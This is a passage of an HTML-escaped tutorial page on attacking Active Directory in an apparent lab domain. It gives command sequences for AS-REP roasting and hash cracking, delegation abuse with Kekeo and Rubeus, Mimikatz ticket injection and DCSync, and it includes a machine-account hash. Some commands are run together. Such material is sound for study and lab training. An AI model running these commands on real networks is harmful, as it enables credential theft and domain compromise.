+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">DoesNotRequirePreAuth&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">DoesNotRequirePreAuth&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or let’s enumerate the permissions for &lt;em>RDPUsers&lt;/em> on ACLs:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;RDPUsers&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Users in &lt;em>RDPUser&lt;/em> group have &lt;em>GenericWrite&lt;/em> or &lt;em>GenericAll&lt;/em> permission on &lt;em>STUDENTI1&lt;/em> user so it is possible to force the disable of Kerberos Preauth on it:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainObject&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-XOR&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">useraccountcontrol&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mf">4194304&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-VerboseGet-DomainUser&lt;/span> &lt;span class="n">-PreauthNotRequired&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Request encrypted AS-REP for offline brute-force&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ASREPRoast&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ASREPHash&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HashCat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ASREPHash&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENTI1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$23$&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It is also possible to enumerate all users with Kerberos preauth disabled and request a hash:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ASREPRoast&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ASREPRoast&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">john_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># HashCat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ASREPRoast&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Hash&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;$krb5asrep$23$&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Out-File&lt;/span> &lt;span class="n">-Encoding&lt;/span> &lt;span class="n">ASCII&lt;/span> &lt;span class="n">hashcat_asrep&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using bleeding-jumbo branch of John The Ripper or HashCat, we can brute-force the hashes offline:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># JohnTheRipper (bleeding-jumbo branch)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/sbin/john --format&lt;span class="o">=&lt;/span>krb5asrep --wordlist&lt;span class="o">=&lt;/span>./10-million-password-list-top-1000000.txt john_asrep.kirbi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># HashCat&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">18200&lt;/span> --force hashcat_asrep.kirbi ./10-million-password-list-top-1000000.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h2 id="unconstrained-delegation">Unconstrained Delegation&lt;/h2>
+&lt;p>General/Basic or Unconstrained Delegation which allows the first hop server (e.g. web server) to request access to any service on any computer in the domain.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Discover domain computers which have unconstrained delegation enabled:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-UnConstrained&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">TrustedForDelegation&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">TrustedForDelegation&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="vm">$True&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Compromise the server(s) where Unconstrained delegation is enabled and trick or wait for a domain admin to connect to the service. We can use the following PowerView command to notify for a particular DA to access a resource on the web server:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;ops-web&amp;#34;&lt;/span> &lt;span class="n">-Poll&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-Delay&lt;/span> &lt;span class="mf">5&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Run following commands on it to check if any DA ticket is available and then export it:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets&amp;#34;&amp;#39;&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::tickets /export&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>The DA ticket could then be reused:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-060a10000-Administrator@krbtgtCYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h2 id="constrained-delegation">Constrained Delegation&lt;/h2>
+&lt;p>Constrained Delegation allows the first hop server (e.g web server) to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers &lt;em>Protocol Transition&lt;/em> to transition the request to Kerberos.&lt;/p>
+&lt;p>To impersonate the user, &lt;strong>Service for User&lt;/strong> (&lt;strong>S4U&lt;/strong>) extension is used and it provides two extensions:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Service for User to Self&lt;/strong> (&lt;strong>S4U2self&lt;/strong>): Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the &lt;em>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION&lt;/em> - T2A4D UserAccountControl attribute.&lt;/li>
+&lt;li>&lt;strong>Service for User to Proxy&lt;/strong> (&lt;strong>S4U2proxy&lt;/strong>): Allows a service to obtain a TGS to a second service on behalf of a user. Which second service? This is controlled by &lt;em>msDS-AllowedToDelegateTo&lt;/em> attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded.&lt;/li>
+&lt;/ul>
+&lt;p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it’s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.&lt;/p>
+&lt;p>Enumerate users and computers with constrained delegation enabled:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainUser&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainComputer&lt;/span> &lt;span class="n">-TrustedToAuth&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADObject&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">msDS-AllowedToDelegateTo&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$null&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="nb">msDS-AllowedToDelegateTo&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="constrained-delegation-allowed-for-a-user-account">Constrained delegation allowed for a User Account&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>To abuse constrained delegation in above scenario, we need to have access to the account for which the constrained delegation is enabled. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of this account as ANY user.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Using &lt;em>asktgt&lt;/em> from Kekeo, we request a TGT as the abused account. Either plaintext password or NTLM hash of the compromised account (with constrained delegation enabled) is required:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgt::ask /user:WEBSVC /domain:cyberlab.cybercorp.local /rc4:[NTLM_HASH_USER_ENABLED_DELEGATION]
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using s4u from Kekeo, we request a TGS as ANY user for the service to which the delegation is enabled, e.g. &lt;em>FILESERVER&lt;/em>, using the TGT previously obtained:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:[TGT_USER_ENABLED_DELEGATION] /user:Administrator@CYBERLAB.CYBERCORP.LOCAL /service:cifs/FILESERVER.CYBERLAB.CYBERCORP.LOCAL
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using mimikatz, inject the TGS ticket:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~FILESERVER.CYBERLAB.CYBERCORP.LOCAL@CYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Access the file shares of the target:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="n">fileserver&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="constrained-delegation-allowed-for-a-machine-account">Constrained delegation allowed for a Machine Account&lt;/h2>
+&lt;p>If you have compromised a machine account or in other words you have SYSTEM level privileges on a machine that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>List services to which the machine account is trusted to delegate to:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">msds-allowedtodelegateto&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">useraccountcontrol&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Select-Object&lt;/span> &lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="nb">msds-allowedtodelegateto&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">fl
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using asktgt from Kekeo, we request a TGT as the abused account (in this case a machine account):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgt::ask /user:cyberlab-adminsrv$ /domain:CYBERLAB.CYBERCORP.LOCAL /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using s4u from Kekeo (no SNAME validation) it is possible to ask for a TGS also for &lt;em>time&lt;/em> and &lt;em>ldap&lt;/em> services by running other two separate commands (putting both the base service and a single alternative one):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># Kekeo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp..local /service:cifs/fileserver.cyberlab.cybercorp.local|time/fileserver.cyberlab.cybercorp.local
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kekeo# tgs::s4u /tgt:TGT_cyberlabadminsrv$@CYBERLAB.CYBERCORP.LOCAL_krbtgt~cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi /user:Administrator@cyberlab.cybercorp.local /service:cifs/fileserver.cyberlab.cybercorp.local|ldap/fileserver.cyberlab.cybercorp.local
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using mimikatz it is possible to inject all the generated TGS tickets (from the previous commands) into the session:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_cifs~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_time~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ldap~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>If we have a ticket for the LDAP service it is possible to perform a DCSync:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\administrator&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>The same procedure can also be performed by using &lt;code>Rubeus&lt;/code>:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Using asktgt from Rubeus, we request a TGT as the abused account (in this case a machine account):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Rubeus&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">cyberlab-adminsrv&lt;/span>&lt;span class="p">$&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CYBERLAB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">CYBERCORP&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LOCAL&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">rc4&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">1fadb1b13edbc5a61cbdc389e6f34c67&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">outfile&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">deleg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Using s4u from Rubeus (no SNAME validation) it is possible to ask for a TGS also for &lt;em>time&lt;/em> and &lt;em>ldap&lt;/em> services (remember to include in the &lt;em>altservice&lt;/em> field also the first service):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Rubeus&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">s4u&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">deleg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">impersonateuser&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">administrator&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">msdsspn&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cifs&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">altservice&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cifs&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ldap&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">wsman&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">rpcss&lt;/span> &lt;span class="p">/&lt;/span>&lt;span 